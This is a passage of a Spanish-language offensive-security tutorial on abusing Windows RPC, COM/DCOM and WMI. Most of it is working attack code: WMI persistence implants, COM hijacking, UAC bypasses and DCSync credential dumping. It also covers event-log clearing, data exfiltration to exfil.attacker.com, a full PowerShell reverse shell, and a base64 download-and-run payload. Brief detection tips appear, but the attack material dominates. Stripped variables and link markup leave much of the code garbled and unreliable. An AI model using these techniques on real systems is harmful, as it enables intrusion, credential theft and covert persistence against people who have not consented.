}

Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = 
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = ''"
    QueryLanguage = "WQL"
    EventNamespace = "root\cimv2"
}

Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = 
    CommandLineTemplate = 
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = "__EventFilter.Name=''"
    Consumer = "CommandLineEventConsumer.Name=''"
}

#### 2. Evento de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) (ProcessCreationEvent):
Ejecuta codigo cuando un proceso especifico arranca:
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "ProcFilter"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
    QueryLanguage = "WQL"
    EventNamespace = "root\cimv2"
}

Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "ProcConsumer"
    CommandLineTemplate = "C:\tools\[payload](../raw/m3t4spl01t.md#payloads).exe"
}

#### 3. Evento de inicio de sesion:
Ejecuta codigo cuando un usuario inicia sesion:
SELECT * FROM __InstanceCreationEvent WITHIN 15 
  WHERE TargetInstance ISA 'Win32_LogonSession'
  AND TargetInstance.LogonType = 2  -- Interactive

#### Deteccion y remocion de persistencia WMI:
# Listar filtros
Get-WmiObject -Namespace root\subscription -Class __EventFilter

# Listar consumers
Get-WmiObject -Namespace root\subscription -Class __EventConsumer

# Listar bindings
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Remover
 = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { .Filter -match "PersistFilter" }
.Delete()

### Herramientas de deteccion:
- Autoruns de Sysinternals (pestana WMI).
- WMIDetect (de la comunidad).
- WMI_Scanner de FireEye.

---

# Abuso Ofensivo de RPC

## 5.1 Enumeracion remota de interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc)

El primer paso para abusar de RPC es saber que interfaces estan disponibles en la maquina remota.

### Con Impacket (rpcdump.py):
impacket-rpcdump 192.168.1.100
impacket-rpcdump DOMAIN/user:password@192.168.1.100

### Lo que muestra rpcdump:
[*] Retrieving interface list from 192.168.1.100
Interface: 12345678-1234-ABCD-EF00-0123456789AB (lsarpc)
  ncacn_ip_tcp:192.168.1.100[49664]
  ncacn_np:\\192.168.1.100\pipe\lsarpc
Interface: 12345778-1234-ABCD-EF00-0123456789AC (samr)
  ncacn_np:\\192.168.1.100\pipe\samr

### Enumeracion con [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell):
Test-NetConnection -ComputerName 192.168.1.100 -Port 135

 = @("lsarpc","samr","netlogon","srvsvc","winreg","spoolss","evtlog")
 | ForEach-Object {
    try {
        System.IO.StreamWriter = New-Object System.IO.Pipes.NamedPipeClientStream("192.168.1.100", , "InOut")
        System.IO.StreamWriter.Connect(2000)
        Write-Host "[+]  accessible" -Foreground Green
        System.IO.StreamWriter.Dispose()
    } catch { Write-Host "[-]  not accessible" -Foreground [red](../raw/r3d3s-f0nd4m3nt0s.md) }
}

---

## 5.2 Abuso de samr para enumerar usuarios

UUID: 12345778-1234-ABCD-EF00-0123456789AC

### Opnums clave:
| Opnum | Nombre | Uso |
|-------|--------|-----|
| 0 | SamrConnect | Conectarse al SAM |
| 6 | SamrEnumerateDomainsInSamServer | Enumerar dominios |
| 13 | SamrEnumerateUsersInDomain | Enumerar usuarios |
| 36 | SamrQueryInformationUser | Info detallada del usuario |

### Con Impacket:
impacket-samrdump DOMAIN/user:password@192.168.1.100

### Con [python](../raw/pyth0n-f0r-h4ck1ng.md):
from impacket.dcerpc.v5 import transport, samr
binding = "ncacn_np:192.168.1.100[\pipe\samr]"
rpc_transport = transport.DCERPCTransportFactory(binding)
rpc_transport.connect()
dce = rpc_transport.DCERPC_class(rpc_transport)
dce.bind(samr.MSRPC_UUID_SAMR)
resp = samr.hSamrConnect(dce)
sam_handle = resp['ServerHandle']
resp = samr.hSamrEnumerateDomainsInSamServer(dce, sam_handle)
for domain in resp['Buffer']['Buffer']:
    print(f"Domain: {domain['Name']}")

---

## 5.3 Abuso de lsarpc para politicas de dominio

UUID: 12345678-1234-ABCD-EF00-0123456789AB

### Opnums clave: LsarQueryInformationPolicy2 (7), LsarLookupNames (14), LsarLookupSids (15)

### Con Impacket:
impacket-lookupsid DOMAIN/user:password@192.168.1.100

### Con [python](../raw/pyth0n-f0r-h4ck1ng.md):
from impacket.dcerpc.v5 import transport, lsarpc
binding = "ncacn_np:192.168.1.100[\pipe\lsarpc]"
rpc_transport = transport.DCERPCTransportFactory(binding)
rpc_transport.connect()
dce = rpc_transport.DCERPC_class(rpc_transport)
dce.bind(lsarpc.MSRPC_UUID_LSARPC)
resp = lsarpc.hLsarOpenPolicy2(dce, '\\.\pipe\lsarpc', lsarpc.POLICY_LOOKUP_NAMES)
policy_handle = resp['PolicyHandle']
resp = lsarpc.hLsarQueryInformationPolicy2(dce, policy_handle, lsarpc.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
print(resp)

---

## 5.4 Abuso de drsuapi (DCShadow/DSync)

UUID: E3514235-4B06-11D1-AB04-00C04FC2DCD2

### DRSGetNCChanges (opnum 3):
Permite replicar cambios de [ad](../raw/w1nd0ws-d0m41n-4dm1n.md). Un atacante con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de replicacion puede obtener:
- Hashes NTLM de todos los usuarios
- Tickets Kerberos
- Secretos de cuentas

### Con Impacket:
impacket-secretsdump -just-dc DOMAIN/admin:password@192.168.1.100
impacket-secretsdump -just-dc-user Administrator DOMAIN/admin:password@192.168.1.100
impacket-secretsdump -hashes LMHASH:NTHASH DOMAIN/admin@192.168.1.100

### Con [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz):
lsadump::[dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) /domain:DOMAIN.local /user:Administrator

### DCShadow:
lsadump::dcshadow /object:usuario /attribute:primaryGroupID /value:512

---

## 5.5 Abuso de srvsvc para recursos compartidos

UUID: 4B324FC8-1610-4BAE-865C-D1F3E7ED4259

### Opnums: NetrShareEnum (15), NetrServerGetInfo (21), NetrSessionEnum (44)

impacket-netview DOMAIN/user:password@192.168.1.100

---

## 5.6 [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Relay / [rpc](../raw/w1n-s9bsyst3ms.md#rpc) over [http](../raw/r3d3s-f0nd4m3nt0s.md#http)

RPC Relay captura desafios NTLM de conexiones RPC y los relayea a otros servidores.
RPC over HTTP (593/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)) permite tunelizar RPC sobre HTTP para bypass de firewalls.

impacket-rpcdump -target 192.168.1.100 -port 593


# Abuso Ofensivo de COM/DCOM

## 6.1 Enumeracion de CLSID y objetos [com](../raw/w1n-s9bsyst3ms.md#com)

### Con OleView .NET:
Archivo -> Conectar a servidor remoto -> 192.168.1.100
Explora CLSID, AppID, [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Permissions.

### Enumeracion con [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell):
Get-ItemProperty HKLM:\Software\Classes\CLSID\* | Select-Object PSChildName, @{N="Name";E={.'(default)'}} | Where-Object { .Name }

Get-ChildItem HKLM:\Software\Classes\CLSID\*\LocalServer32 | ForEach-Object {
    [PSCustomObject]@{ CLSID=.Parent.PSChildName; Path=.GetValue("") }
}

Get-ChildItem HKLM:\Software\Classes\AppID\* | ForEach-Object {
    [PSCustomObject]@{ AppID=.PSChildName; Name=.GetValue(""); LaunchPerm=.GetValue("LaunchPermission") }
}

---

## 6.2 [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking paso a paso

### CLSID inexistente:
 = "{CLSID-A-REGISTRAR}"
New-Item -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Force
[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Name "(Default)" -Value "C:\tools\beacon.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Name "ThreadingModel" -Value "Apartment"

### TreatAs hijacking:
New-ItemProperty -Path "HKCR:\CLSID\{A-ORIGINAL}" -Name "TreatAs" -Value "{B-MALICIOSO}"

### Extension hijacking:
New-Item -Path "HKCU:\Software\Classes\.xyz\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\.xyz\shell\open\command" -Name "(Default)" -Value "C:\malware.exe %1"

### Deteccion:
Get-ChildItem "HKCU:\Software\Classes\CLSID" -Recurse -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\Software\Classes\CLSID\* | Where-Object { .TreatAs }

---

## 6.3 [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) via [com](../raw/w1n-s9bsyst3ms.md#com) Elevation

### FodHelper:
 = "HKCU:\Software\Classes\ms-settings\shell\open\command"
New-Item -Path  -Force
[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ItemProperty -Path  -Name "(Default)" -Value "cmd.exe /c C:\tools\[payload](../raw/m3t4spl01t.md#payloads).exe"
Set-ItemProperty -Path  -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

### ComputerDefaults:
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\ComputerDefaults.exe"

### Event Viewer:
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "C:\tools\payload.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

---

## 6.4 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Lateral Movement

### MMC20.Application:
 = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", "192.168.1.100"))
.Document.ActiveView.ExecuteShellCommand("cmd.exe", , "/c calc.exe", "7")

### ShellBrowserWindow:
 = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "192.168.1.100"))
.ShellExecute("calc.exe")

### Excel DCOM:
 = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.1.100"))
.DisplayAlerts = False
.Workbooks.Add()
.ActiveWorkbook.Sheets(1).Cells(1,1) = "=EXEC('calc.exe')"
.Quit()

### Impacket:
impacket-dcomexec DOMAIN/user:password@192.168.1.100
impacket-dcomexec -object MMC20 DOMAIN/user:password@192.168.1.100

### Requisitos:
- [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 + [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) dinamico abierto
- Remote Service Management en [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)
- Administrador local
- LocalAccountTokenFilterPolicy = 1

---

## 6.5 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Shellcode Injection

Usar objetos [com](../raw/w1n-s9bsyst3ms.md#com) con acceso a memoria para inyectar shellcode.

 = [activator]::CreateInstance([type]::GetTypeFromCLSID("76A64158-CB41-11D1-8B02-00600806D9B6", "192.168.1.100"))
.ConnectServer("192.168.1.100", "root\cimv2")
 = .Get("Win32_Process")
.Create("calc.exe")


# Abuso Ofensivo de WMI

## 7.1 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Process Creation remoto

 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Process
.Create("calc.exe")

 = New-CimSession -ComputerName 192.168.1.100
Invoke-CimMethod -CimSession  -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }

### Con Impacket:
impacket-wmiexec DOMAIN/user:password@192.168.1.100
impacket-wmiexec -hashes :NTHASH DOMAIN/user@192.168.1.100

### Como funciona wmiexec:
1. Conecta WMI (135 + dinamico)
2. Ejecuta: cmd.exe /q /c <comando> 2>&1
3. Redirige output a ADMIN$\__output
4. Lee via [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)

### Con WMIC:
wmic /node:192.168.1.100 /user:DOMAIN\user process call create "calc.exe"

### Limitaciones:
- No interactivo
- Usa cmd.exe /c como wrapper
- [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) hijo como SYSTEM
- [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) debe permitir [dcom](../raw/w1n-s9bsyst3ms.md#dcom)

---

## 7.2 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Persistence Implant

function Install-WmiPersistence {
    param(="UpdaterService", ="HealthCheckFilter", ="HealthCheckConsumer", =300, ="calc.exe")
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name=''" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name=''" | Remove-WmiObject -ErrorAction SilentlyContinue
    [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance -Namespace root\cimv2 -Class __TimerInstruction -Arguments @{ TimerId=; IntervalBetweenEvents=(*1000); SkipIfPassed=False } | Out-Null
    Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name=; Query="SELECT * FROM __TimerEvent WHERE TimerID = ''"; QueryLanguage="WQL"; EventNamespace="root\cimv2" } | Out-Null
    Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name=; CommandLineTemplate= } | Out-Null
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter="__EventFilter.Name=''"; Consumer="CommandLineEventConsumer.Name=''" } | Out-Null
    Write-Host "[+] WMI persistence installed"
}

function Remove-WmiPersistence {
    param(="HealthCheckFilter", ="HealthCheckConsumer")
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name=''" | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name=''" | Remove-WmiObject
}

### Process creation event:
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "ProcFilter"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'"
    QueryLanguage = "WQL"
    EventNamespace = "root\cimv2"
}

### Almacenamiento: C:\Windows\System32\wbem\Repository

### Deteccion:
- Sysinternals Autoruns (WMI tab)
- Event ID 5861
- Get-WmiObject -Namespace root\subscription -Class __EventFilter
- Get-WmiObject -Namespace root\subscription -Class __EventConsumer

---

## 7.3 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Data Exfiltration

 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Process | Select-Object Name, ProcessId
 | Export-Csv "\\server\share\data.csv" -NoTypeInformation

 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_ComputerSystem).UserName))
System.Net.[[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)]::GetHostAddresses(".exfil.attacker.[com](../raw/w1n-s9bsyst3ms.md#com)")

 = New-Object System.Net.WebClient
.UploadString("[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://192.168.1.50/exfil", (Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_QuickFixEngineering | ConvertTo-Json))

---

## 7.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Event Log Tampering

 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_NTEventlogFile -Filter "LogFileName='Security'"
.ClearEventLog()

---

## 7.5 Living off the Land con [wmi](../raw/w1n-s9bsyst3ms.md#wmi)

### [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells):
$Process.Create("cmd.exe /c [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) -NoP -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('192.168.1.50',4444);$s=$c.GetStream();$b=New-Object Byte[] 1024;($r=$s.Read($b,0,$b.Length))-gt0;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$sb=(iex $d 2>&1);$sb2=$sb | Out-String;$sb2=[Text.ASCIIEncoding]::GetBytes($sb2);$s.Write($sb2,0,$sb2.Length)"")

### WMI Queries LOTL:
Get-WmiObject Win32_ComputerSystem | Select-Object UserName, PartOfDomain, Domain
Get-WmiObject Win32_QuickFixEngineering | Where-Object { .HotFixID -match "KB5" }
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, DriveType, Size, FreeSpace
Get-WmiObject Win32_UserAccount | Select-Object Name, SID, Disabled
Get-WmiObject Win32_Process | Where-Object { .GetOwner().User -match "Administrator" }
Get-WmiObject Win32_Product | Select-Object Name, Version
Get-WmiObject Win32_Environment | Select-Object Name, VariableValue
Get-WmiObject Win32_Service | Select-Object Name, State, StartMode, PathName


# Herramientas

## 8.1 Impacket

Instalacion: pip install impacket

### [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Tools:
| Tool | Uso |
|------|-----|
| rpcdump.py | Enumerar interfaces RPC |
| samrdump.py | Enumerar SAM via RPC |
| lookupsid.py | Enumerar SIDs via lsarpc |
| secretsdump.py | Dumpear hashes (DSync) |
| netview.py | Ver sesiones/shares |

### [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Tools:
| Tool | Uso |
|------|-----|
| dcomexec.py | Ejecucion via DCOM |
| dcompermissions.py | Enumerar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) DCOM |

### [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Tools:
| Tool | Uso |
|------|-----|
| wmiexec.py | Shell semi-interactiva via WMI |
| wmipersist.py | WMI persistence |

### Auxiliares:
getTGT.py, getST.py, ticketer.py, smbexec.py, atexec.py, reg.py

---

## 8.2 OleView .NET

Parte de Windows SDK. GUI para examinar [com](../raw/w1n-s9bsyst3ms.md#com).
- Navegar CLSIDs, Interfaces, AppIDs, TypeLibs
- Ver [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) [dcom](../raw/w1n-s9bsyst3ms.md#dcom)
- Conectar a remotos
- Probar creacion de objetos

Ubicacion tipica: %ProgramFiles([x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86))%\Windows Kits\10\bin\10.0.xxxxx.0\[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)\OleViewDotNet.exe

Uso ofensivo:
1. View -> Group by CLSID
2. Buscar CLSIDs con permisos debiles
3. Right-click -> Create Instance on Remote...

---

## 8.3 RPCView

GUI para ver interfaces [rpc](../raw/w1n-s9bsyst3ms.md#rpc).
GitHub: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/silverf0x/RpcView

Muestra: interfaces, endpoints, metodos, PID, [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).

Uso: File -> Connect to remote -> [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) -> Export.

---

## 8.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Explorer / wbemtest

### wbemtest:
Viene con Windows. Win+R -> wbemtest
- Conectar a namespace (root\cimv2)
- Ejecutar WQL
- Llamar metodos

Conexion remota: \\192.168.1.100\root\cimv2

### WMI Explorer (SAPIEN):
Herramienta externa. Muestra namespaces, clases, propiedades, metodos.
Permite ejecutar WQL y exportar.

---

## 8.5 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para [rpc](../raw/w1n-s9bsyst3ms.md#rpc)/[com](../raw/w1n-s9bsyst3ms.md#com)/[wmi](../raw/w1n-s9bsyst3ms.md#wmi)

### Named pipes RPC:
 = New-Object System.IO.Pipes.NamedPipeClientStream("192.168.1.100", "samr", [System.IO.Pipes.PipeDirection]::InOut)
.Connect(3000)

### COM desde PowerShell:
 = New-Object -ComObject WScript.Shell
.Run("calc.exe", 0)

 = New-Object -ComObject InternetExplorer.Application
.Visible = False
.Navigate("[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://malware.com")

### WMI desde PowerShell:
Get-WmiObject -Class Win32_Process
Get-CimInstance -ClassName Win32_Process
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
Register-CimIndicationEvent -ClassName __InstanceCreationEvent -SourceIdentifier ProcMon

### [dcom](../raw/w1n-s9bsyst3ms.md#dcom) desde PowerShell:
[activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "192.168.1.100"))

### [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) COM con VBScript:
[set](../raw/ph1sh1ng.md#social-engineering-toolkit) objShell = CreateObject("WScript.Shell")
objShell.Run "calc.exe", 0, False

---

## 8.6 [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike)

### Comandos relacionados:
| Comando | Que hace |
|---------|----------|
| execute-[assembly](../raw/4ss3mbly-f0r-h4ck3rs.md) SharpLateral.exe [dcom](../raw/w1n-s9bsyst3ms.md#dcom) <target> <exe> | DCOM lateral movement |
| jump dcom <target> <listener> | DCOM jump via MMC |
| jump [wmi](../raw/w1n-s9bsyst3ms.md#wmi) <target> <listener> | WMI jump |
| powerpick Get-WmiObject ... | Ejecutar WMI en contexto beacon |
| wmi <target> <command> | WMI execution |
| dcom <target> <command> | DCOM execution |

### Aggressor scripts:
Muchos scripts de agresor implementan DCOM/WMI lateral movement custom.

---

## 8.7 Otras herramientas piolas

| Herramienta | Que hace |
|-------------|----------|
| SharpLateral | [dcom](../raw/w1n-s9bsyst3ms.md#dcom)/[wmi](../raw/w1n-s9bsyst3ms.md#wmi)/[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) lateral movement en C# |
| WMIOps | Scripts de [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para WMI ofensivo |
| WMI_Persistence | Modulo de PowerShell para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) WMI |
| COMProxy | Tool para [com](../raw/w1n-s9bsyst3ms.md#com) hijacking |
| MSFVenom + [meterpreter](../raw/m3t4spl01t.md#meterpreter) | Modulos: [exploit](../raw/m3t4spl01t.md#exploits)/windows/local/xxx (COM hijack) |
| PowerSploit | Module: Invoke-DCOM, Invoke-WMI |
| Sysinternals Autoruns | Detecta persistencia COM y WMI |
| ProcMon (Sysinternals) | Monitorear acceso a CLSIDs en registry |


# Proyectos Practicos

## 9.1 Enumeracion [rpc](../raw/w1n-s9bsyst3ms.md#rpc) remota con [python](../raw/pyth0n-f0r-h4ck1ng.md)

from impacket.dcerpc.v5 import transport, samr, lsarpc, srvsvc

TARGET = "192.168.1.100"
USER = "DOMAIN\\user"
PASS = "password"

def enum_samr():
    binding = f"ncacn_np:{TARGET}[\\pipe\\samr]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    rpc_transport.connect()
    dce = rpc_transport.DCERPC_class(rpc_transport)
    dce.bind(samr.MSRPC_UUID_SAMR)
    
    resp = samr.hSamrConnect(dce)
    handle = resp['ServerHandle']
    resp = samr.hSamrEnumerateDomainsInSamServer(dce, handle)
    for domain in resp['Buffer']['Buffer']:
        print(f"[*] Domain: {domain['Name']}")
        
        dom_resp = samr.hSamrOpenDomain(dce, handle, 0x200, domain['Sid'])
        dom_handle = dom_resp['DomainHandle']
        
        enum_resp = samr.hSamrEnumerateUsersInDomain(dce, dom_handle, 0, 0x100)
        for user in enum_resp['Buffer']['Buffer']:
            print(f"    User: {user['Name']}")

def enum_lsarpc():
    binding = f"ncacn_np:{TARGET}[\\pipe\\lsarpc]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    rpc_transport.connect()
    dce = rpc_transport.DCERPC_class(rpc_transport)
    dce.bind(lsarpc.MSRPC_UUID_LSARPC)
    
    resp = lsarpc.hLsarOpenPolicy2(dce, f"\\\\{TARGET}", 0x800)
    policy_handle = resp['PolicyHandle']
    
    resp = lsarpc.hLsarQueryInformationPolicy2(dce, policy_handle, lsarpc.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
    print(f"[*] Domain: {resp['PolicyInfo']['DomainName']}")

if __name__ == '__main__':
    enum_samr()
    enum_lsarpc()

Este script conecta via named pipes a samr y lsarpc, enumera dominios y usuarios.

---

## 9.2 [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

### Objetivo:
Registrar un CLSID en HKCU para que cuando una aplicacion lo intente crear, cargue nuestra DLL.

### Pasos:
1. Identificar un CLSID que una aplicacion intenta crear pero no existe.
   - Usar ProcMon: Filter -> RegOpenKey -> Path contains CLSID -> Result is NAME NOT FOUND
2. Crear la DLL maliciosa (beacon.dll, [meterpreter](../raw/m3t4spl01t.md#meterpreter).dll, etc.)
3. Registrar el CLSID:
    = "{CLSID-FAKE}"
   New-Item -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Force
   [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Name "(Default)" -Value "C:\path\to\beacon.dll"
   Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
4. Esperar a que el usuario ejecute la aplicacion que referencia el CLSID.
5. La DLL se carga en el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de la aplicacion.

### CLSIDs conocidos para hijacking:
- {D9144DCD-E998-4ECA-AB6A-DCD83CC58416}: Windows [cloud](../raw/cl0ud-h4ck1ng.md) Store
- {9C073F21-15B4-49B2-9E4B-35C81D4E27E6}: Xbox Live
- Muchos CLSIDs de Microsoft Office

### Deteccion:
- Sysinternals Autoruns -> COM tab
- Get-ChildItem "HKCU:\Software\Classes\CLSID"
- Monitorear procesos que cargan DLLs desde paths de usuario

---

## 9.3 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Lateral Movement a un equipo remoto

### Objetivo:
Ejecutar un comando en una maquina remota usando DCOM (MMC20.Application).

### Requisitos:
- Credenciales validas (administrador local del remoto)
- [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135 + [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) dinamico accesible
- Remote Service Management habilitado en [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)
- LocalAccountTokenFilterPolicy = 1 (para cuentas locales)

### Paso a paso:

1. Verificar conectividad:
Test-NetConnection 192.168.1.100 -Port 135

2. Probar [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion):
dir \\192.168.1.100\C$

3. Ejecutar DCOM MMC:
 = "192.168.1.100"
 = "DOMAIN\\Admin"
 = "P@ssw0rd"

 = ConvertTo-SecureString  -AsPlainText -Force
 = New-Object System.Management.Automation.PSCredential(, )

 = [activator]::CreateInstance(
    [type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", )
)
.Document.ActiveView.ExecuteShellCommand(
    "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe", ,
    "-NoP -W Hidden -Exec Bypass -C "Start-Process calc.exe"",
    "7"
)

4. Verificar que el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) corra en el remoto:
Get-WmiObject -ComputerName  -Credential  -Class Win32_Process -Filter "Name='calc.exe'"

5. Si falla, checkear:
- Firewall: Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
- Registry: LocalAccountTokenFilterPolicy = 1
- Auth level: RPC_C_AUTHN_LEVEL_PKT_PRIVACY (a veces necesario)

### Usando Impacket:
impacket-dcomexec DOMAIN/user:password@192.168.1.100

### Usando [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike):
jump dcom 192.168.1.100 beacon

---

## 9.4 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Remote Process Creation

### Objetivo:
Crear un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) en una maquina remota usando WMI y recuperar el output.

### Paso a paso:

1. Verificar WMI disponible:
Test-WSMan 192.168.1.100
Get-WmiObject -List -ComputerName 192.168.1.100 | Where-Object { .Name -eq "Win32_Process" }

2. Crear proceso:
 = Get-WmiObject -ComputerName 192.168.1.100 -Class Win32_Process
 = .Create("cmd.exe /c whoami > C:\Windows\Temp\output.txt 2>&1")

3. Leer output:
Get-Content "\\192.168.1.100\C$\Windows\Temp\output.txt"

4. Proceso mas complejo con [payload](../raw/m3t4spl01t.md#payloads) en base64:
 = "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe -NoP -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA1ADAALwBhAC4AcABzADEAJwApAA=="

 = .Create("cmd.exe /c ")

5. Usando Invoke-CimMethod (WinRM):
 = New-CimSession -ComputerName 192.168.1.100
Invoke-CimMethod -CimSession  -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "calc.exe"
}

6. Usando Impacket:
impacket-wmiexec DOMAIN/user:password@192.168.1.100

---

